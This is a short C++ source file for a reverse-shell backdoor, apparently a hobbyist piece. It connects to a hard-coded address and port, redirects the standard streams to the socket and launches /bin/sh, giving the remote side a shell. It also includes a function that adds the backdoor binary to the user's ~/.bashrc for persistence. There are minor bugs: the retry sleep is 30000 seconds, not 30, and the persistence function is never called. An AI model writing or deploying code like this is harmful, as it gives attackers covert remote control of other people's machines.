#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <iostream>
#include <cstdlib>

int init_and_connect() {
    struct sockaddr_in server;

    // Initialize socket
    int s = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("0.0.0.0"); 
    server.sin_port = htons(13337);

    // Sleep for 30s if failed, then try reconnecting
    while ((connect(s, (struct sockaddr*)&server, sizeof(server))) < 0) {
        // std::cerr << "Retry connection in 30s...\n";
        sleep(30000);
    }

    std::cout << "Connected!!\n";

    return s;
}

// This method sucks, but I don't know anyway than this :P
// We assume the user use bash shell in this case
void keep_persistence() {
    std::system(" \
        awk '/bacc/\
        {\
            found = 1\
        }\
        END {\
            if (!found)\
                print '/home/kali/Sus/bacc' >> ~/.bashrc\
        }'\
        /home/kali/.bashrc\
    ");
}

int main() {
    int s = init_and_connect();

    // Duplicate file descriptors for stdin, stdout, and stderr
    // Source: ChatGPT :D
    dup2(s, 0); // stdin
    dup2(s, 1); // stdout
    dup2(s, 2); // stderr

    // open shell
    execl("/bin/sh", "/bin/sh", NULL);

    close(s);
    return 0;
}
